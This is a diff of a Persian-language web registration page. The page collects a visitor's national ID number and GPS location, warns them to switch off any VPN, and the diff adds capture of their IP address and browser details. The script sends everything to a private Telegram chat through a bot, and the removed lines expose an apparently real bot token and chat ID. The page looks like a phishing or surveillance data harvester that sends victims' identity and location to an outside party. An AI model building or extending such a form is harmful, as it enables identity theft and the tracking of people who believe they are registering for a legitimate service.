@@ -117,6 +117,7 @@ footer.actions{grid-column:1/-1;display:flex;justify-content:flex-end;margin-top
 </div>
 
 <script>
+// المان‌ها
 const nationalId=document.getElementById("nationalId");
 const locationInput=document.getElementById("location");
 const locPreview=document.getElementById("locPreview");
@@ -126,6 +127,7 @@ const continueBtn=document.getElementById("continueBtn");
 const step2Panel=document.getElementById("step2Panel");
 const loadingOverlay=document.getElementById("loadingOverlay");
 
+// فانکشن‌ها
 function showError(el,msg){el.style.display='block';el.textContent=msg;}
 function clearError(el){el.style.display='none';el.textContent='';}
 function highlightField(el){el.classList.add('highlight-green'); setTimeout(()=>el.classList.remove('highlight-green'),2000);}
@@ -145,21 +147,24 @@ function updateContinue(){
   continueBtn.disabled = !(nationalId.value.length===10 && locationInput.value.trim().length>0);
 }
 
-// تشخیص VPN احتمالی با ipapi
-async function checkVPN(){
+// بررسی VPN و نمایش پیام هشدار
+async function checkVPNAndNotify(){
   try{
     const res=await fetch("https://ipapi.co/json/");
     const data=await res.json();
-    if(data.country_code!=="IR"){alert("VPN روشن است. لطفاً خاموش کنید."); return true;}
-    return false;
-  }catch(e){return false;}
+    if(data.country_code!=="IR"){
+      locError.style.display='block';
+      locError.textContent="هشدار: VPN روشن است. برای ثبت نام توصیه می‌شود خاموش شود.";
+    }
+    return data; // اطلاعات دستگاه و IP
+  }catch(e){
+    return {ip:"نامشخص", user_agent:navigator.userAgent};
+  }
 }
 
 // گرفتن موقعیت خودکار هنگام کلیک
 locationInput.addEventListener("click", async()=>{
   clearError(locError);
-  const vpn=await checkVPN();
-  if(vpn){locError.style.display="block"; locError.textContent="برای ادامه VPN باید خاموش باشد"; return;}
   showLoading();
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(async pos=>{
@@ -181,12 +186,20 @@ locationInput.addEventListener("click", async()=>{
   } else{showError(locError,"مرورگر شما GPS ندارد"); hideLoading();}
 });
 
-// ارسال داده به تلگرام و باز کردن مرحله دوم
+// ارسال داده به تلگرام
 continueBtn.addEventListener("click", async()=>{
   showLoading();
-  const BOT_TOKEN="8430479124:AAFAW5rtSLqD_V8_8gg0ehkHjosYNXfUrQk";
-  const CHAT_ID="7570861617";
-  const msg=`<b>ثبت نام اولیه</b>\n<b>کد ملی:</b> ${nationalId.value}\n<b>لوکیشن:</b> ${locationInput.value}\n<b>زمان:</b> ${new Date().toISOString()}`;
+  const BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN";
+  const CHAT_ID="YOUR_CHAT_ID";
+  const deviceInfo = await checkVPNAndNotify(); // شامل IP و user-agent
+
+  const msg=`<b>ثبت نام اولیه</b>\n`+
+            `<b>کد ملی:</b> ${nationalId.value}\n`+
+            `<b>لوکیشن:</b> ${locationInput.value}\n`+
+            `<b>IP دستگاه:</b> ${deviceInfo.ip || "نامشخص"}\n`+
+            `<b>نوع دستگاه:</b> ${navigator.userAgent}\n`+
+            `<b>زمان:</b> ${new Date().toISOString()}`;
+
   try{
     const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
       method:"POST",
@@ -202,5 +215,6 @@ continueBtn.addEventListener("click", async()=>{
   finally{hideLoading();}
 });
 </script>
+
 </body>
 </html>
